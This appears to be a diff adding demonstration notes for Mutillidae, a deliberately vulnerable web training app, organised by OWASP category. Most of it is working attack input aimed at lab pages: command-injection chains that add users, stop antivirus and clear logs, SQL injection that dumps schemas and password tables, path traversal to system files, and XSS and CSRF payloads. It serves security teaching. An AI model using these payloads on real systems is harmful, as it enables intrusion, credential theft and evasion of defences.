@@ -1,0 +1,385 @@
+Topics
+
+Installation
+
+	XAMPP
+	VM
+	Samurai - Bootable DVD
+	Samurai Installation
+	Custom Bootable DVD
+
+Mutillidae Uses
+
+1. Teach web developers how to write secure code
+2. Teach web developers what exploits may be possible
+3. Teach web developers insecure coding patterns
+4. Demonstrate to DBAs what exploits may be possible
+5. Demonstrate to management what exploits may be possible
+
+--------------------
+Demonstration
+--------------------
+
+Pen Testing Methodology (CEH version)
+
+	Recon
+	Scanning (Discover hosts, ports, services, internal network map, Enumerating user names)
+	Gaining Access
+	Maintaining Access
+	Cover Tracks
+
+-------------------------
+Command Injection
+-------------------------
+	Page: dns-lookup.php
+
+Recon: Discover available functionality using provided help
+
+	Windows XP: && help
+	Linux: && <cmd> --help
+	Linux: && man <cmd>
+
+Recon: Determine current directory
+
+	Windows XP: && dir
+	Linux: && pwd
+
+Recon: Chain commands to discover driectory structure
+
+	Windows XP: && cd ../../.. && dir
+	Linux: && cd ../../.. && ls -l
+
+Scanning: Get machine network settings, hostname, DNS servers, subnet mask, etc.
+
+	Windows XP: && ipconfig /all
+	Linux: && ifconfig
+
+Scanning: Discover hosts on network
+
+	Windows XP: && ping -n 1 192.168.56.102
+	Linux: && ping -c 1 192.168.56.102
+
+Scanning: Enumerate Current user
+
+	Windows XP: && set
+	Linux: && whoami
+
+Scanning: Enumerate computers, users, groups, AD computers, AD users, AD groups
+
+	Windows XP: && net view [/domain]
+	Windows XP: && net user [/domain]
+	Windows XP: && net localgroup [/domain]
+
+Gaining Access: Add user
+
+	Windows XP: && net user <username> /add
+	Linux: useradd <username> 
+
+Gaining Access: Delete user
+
+	Windows XP: && net user <username> /delete 
+
+Maintain Access: kill AV
+
+	net stop <av process>
+
+Maintain Access: Kill AV/protective services or open backdoor services
+	Windows XP: net stop <service name>
+	Windows XP: && net start telnet
+	Windows XP: && net stop telnet
+	
+Cover Tracks: Clear logs
+
+	Windows XP: && wevtutil cl
+
+-------------------------
+SQL Injection
+-------------------------
+
+	Page: user-info.php
+
+
+Recon: Extract table names from database
+
+' union select null,table_schema AS username,table_name AS password,null from INFORMATION_SCHEMA.TABLES-- 
+
+Recon: Extract table columns from database using a single field
+
+' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS-- 
+
+Recon: Extract views from database
+
+' union select null,concat_ws('.', COALESCE(table_schema,''), COALESCE(table_name,''), COALESCE(view_definition,'')) AS username,null,null from INFORMATION_SCHEMA.VIEWS-- 
+
+Recon: Extract triggers from database
+
+' union select null,concat_ws('.', trigger_schema, trigger_name) AS username,null,null from INFORMATION_SCHEMA.TRIGGERS-- 
+
+Recon: Extract routines/procs from database
+
+' union select null,concat_ws('.', routine_schema, routine_name, routine_type, routine_body) AS username,null,null from INFORMATION_SCHEMA.ROUTINES-- 
+
+Recon: Extract table columns from database
+
+' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS union select null,concat_ws('.', routine_schema, routine_name, routine_type, routine_body) AS username,null,null from INFORMATION_SCHEMA.ROUTINES union select null,concat_ws('.', table_schema, table_name, view_definition) AS username,null,null from INFORMATION_SCHEMA.VIEWS union select null,concat_ws('.', trigger_schema, trigger_name) AS username,null,null from INFORMATION_SCHEMA.TRIGGERS-- 
+
+Recon: Blind SQL Injection/Brute Forcing values
+
+' union Select null, case current_user() when 'root@localhost' THEN sleep(5) ELSE sleep(0) END, null, null -- 
+
+Recon/Scanning: Get specifications on database software
+
+' union select null, database(), current_user(), version() -- 
+
+Gaining Access: Extract passwords from user table
+
+' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- 
+
+Maintaining Access:
+
+Covering Tracks:
+
+	Page: login.php
+
+Gaining Access: Using SQL Injection
+
+' or 1=1 -- 
+
+------------------------------------------------------------------------------------------
+Broken Authentication and Session Management - Escalating privileges
+------------------------------------------------------------------------------------------
+
+Gaining Access: Using insecure client-side authentication tokens
+
+Page: Any page
+Tool: Web Developer Toolbar
+
+Note what cookies the site has by default
+Create a test account
+Login using test account
+Check what cookies the site has after authentication
+Logout
+Verify auth cookies are gone or get rid of them
+Create a new cookie based on the original auth cookie, but with different value
+
+Gaining Access: Using insecure client-side authentication tokens
+
+Page: Any page
+Tool: Cookies Manager+ version 1.5.1 (verified with Firefox 4.0.1)
+
+Note what cookies the site has by default
+Create a test account
+Login using test account
+Check what cookies the site has after authentication
+Differential Analysis: Change the value of the original auth cookie
+
+
+------------------------------------------------------------------------------------------
+Broken Authentication and Session Management - Bypass Authorization Control
+------------------------------------------------------------------------------------------
+
+Gaining Access: Using SQL injection
+
+Page: login.php
+Field: Username
+Value: ' or 1=1 -- 
+
+------------------------------------------------------------
+Insecure Direct Object Reference - Accessing system files
+------------------------------------------------------------
+
+Step 1: Recon: Obtain list of files
+
+Possible Technique: Use command injection
+Page: dns-lookup.php
+Value (Windows): && dir /w
+Value (Linux): && pwd && ls -l
+
+Possible Techniques: Use robots.txt
+Possible Techniques: Use directory browsing
+Possible Techniques: Use directory brute-forcing
+
+Step 2: Gaining Access: Retrive system files
+
+Page: source-viewer.php
+Technique: Use proxy to change value, Use parent directory to bypass jails
+Tool: Tamper Data, Paros, WebScarab, Burp
+Field: phpfile
+Value: <system file path>, ../../../boot.ini, ..\..\..\WINDOW\System32\drivers\etc\hosts, ../../../etc/passwd
+
+-----------------------------
+Cross Site Scripting
+-----------------------------
+
+Page: add-to-your-blog.php
+Field: blog contents
+Value: <script>alert("Cookie stolen and sent to mallicious server: " + document.cookie + ". The developer should have encoded all output, validated all input, )</script>
+
+HTTP Header: Browser User Agent String
+Tool: User Agent Switcher
+Value: <h1>Sorry, please login again</h1><br/>Username<input type="text"><br/>Password<input type="text"><br/><input type="submit" value="Submit"><h1>&nbsp;</h1>
+
+
+Defense: Encoding
+Defense When certain tokens allowed: Mapping
+
+-----------------------------
+Cross Site Request Forgery
+-----------------------------
+
+Page: add-to-your-blog, view-someones-blog
+Tool: HTTPFox (to view forged request)
+
+Force someone to add a blog without consent
+
+<form id="f" action="index.php?page=add-to-your-blog.php" method="post" enctype="application/x-www-form-urlencoded">
+<input type="hidden" name="blog_entry" value="Add this guy to the Wall of Sheep"/>
+<input type="hidden" name="add-to-your-blog-php-submit-button" value="TESTING"/>
+</form>
+<i onmouseover="window.document.getElementById(\'f\').submit()">Dancing with the stars results</i>
+
+Force someone to log out
+<i onmouseover="window.document.location=\'http://localhost/mutillidae/index.php?do=logout\'">How to improve your Facebook status</i>
+
+-------------------------
+Security Misconfiguration
+-------------------------
+
+Improper Error Handling: 
+
+Page: login.php
+Field: username
+Value: <single quote>
+Result: Error gives SQL exception
+
+---------------------------------
+Insecure Direct Object References
+---------------------------------
+
+Page: source-viewer.php
+Field: phpfile
+Value (Windows XP): c:\boot.ini, C:\WINDOWS\system32\drivers\etc\hosts
+Tool: netcat, tamper data, paros, webscarab, burp
+
+Use netcat or hackbar to send in post data: 
+	
+	phpfile=c:\boot.ini&source-file-viewer-php-submit-button="View File"
+	phpfile=C:\WINDOWS\system32\drivers\etc\hosts&source-file-viewer-php-submit-button="View File"
+
+Alternative: Use proxy to change value of phpfile to system file
+
+---------------------------------
+Insecure Cryptographic Storage
+---------------------------------
+
+Extract passwords from system:
+
+Page: user-info.php
+Technique: Direct SQL injection
+Field: username
+Value: ' or 1=1 -- 
+
+Page: user-info.php
+Technique: Indirect SQL injection
+Field: username
+Value: ' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- 
+
+Page: login.php
+Technique: Blind SQL Injection
+Field: username
+Value (Using Proxy): ' union Select null, case SUBSTRING(current_user(),1,1) when 'r' THEN sleep(5) ELSE sleep(0) END, null, null -- 
+Value (Using Direct Request): username=%27%20union%20Select%20null%2C%20case%20SUBSTRING%28current_user%28%29%2C1%2C1%29%20when%20%27r%27%20THEN%20sleep%285%29%20ELSE%20sleep%280%29%20END%2C%20null%2C%20null%20--%20&password=&login-php-submit-button=1
+
+
+---------------------------------
+Failure to Restrict URL Access
+---------------------------------
+
+Page: robots.txt
+Technique: Security Misconfiguration, Design Flaw
+
+Recon: List Files
+Technique: Shoulder surfing
+
+Recon: List Files
+Technique: Steal Bookmarks
+
+Recon: List Files
+Technique: Dump client cache
+
+Recon: List Files
+Page: dns-lookup.php
+Technique: Command Injection
+Field: hostname
+
+Scanning: View Source Code 
+Page: dns-lookup.php
+Technique: Command Injection
+Field: hostname
+Value: && type config.inc (then see source because PHP code doesnt show in browser)
+
+Gaining Access: View restricted page
+Page: Any (i.e. - http://localhost/mutillidae/config.inc, http://localhost/mutillidae/passwords/accounts.txt)
+Technique: Type in URL
+
+------------------------------------------
+Insufficient Transport Layer Protection
+------------------------------------------
+
+Gaining Access: Intercept clear text credentials
+Page: login.php
+Tool: Use any proxy (Paros, Tamper Data) or sniffer (Wireshark, TCPDump, Snort, etc.)
+Fields: Username and Password
+
+------------------------------------------
+Unvalidated redirects and forwards
+------------------------------------------
+
+Page: credits.php
+Technique: Phishing
+Tool: Any proxy, netcat, hackbar
+Field: forwardurl
+Value: any URI
+
+Page: credits.php
+Technique: Horizontal Application Attack, Restricted URL Access, Authroization Bypass
+Tool: Hackbar, anything that can change the URL query parameters
+Field: forwardurl
+Value: http://localhost/xampp
+
+--------------------------------------------
+Information Asset Protection - Cache Control
+--------------------------------------------
+
+Recon: Grab leaked company information
+Page: index.php, all
+Technique: View local cache
+Tool: Firefox about:cache, Internet Explorer Tools-->Options-->General Tab-->Browser History Settings-->View Files
+Defenses: cache control headers
+
+--------------------------------------------
+Information Asset Protection - Framing
+--------------------------------------------
+
+Gaining Access: Cross Frame Scripting/Click-jacking
+Page: index.php, all
+Tecnique: Frame page, use overlay
+Tool (to view defenses): HTTPFox
+Defense: x-frame-options, frame busters
+
+----------------------------------------------
+Information Asset Protection - Leaked Comments
+----------------------------------------------
+
+Page: index.php
+Technique: View Source
+Tool: View Source, Sniffer (Wireshark), HTTPFox
+Defense: Use framework comment tags to trap comments on the app server
+
+----------------------------------------------
+Log Injection
+----------------------------------------------
+
+Page: show-log.php
+Technique: Figure out what fields are logged, which of those the client controls, and inject those fields with SQL injection, HTML injection, XSS, XSRF, etc.
+Defense: Logs should be output encoded
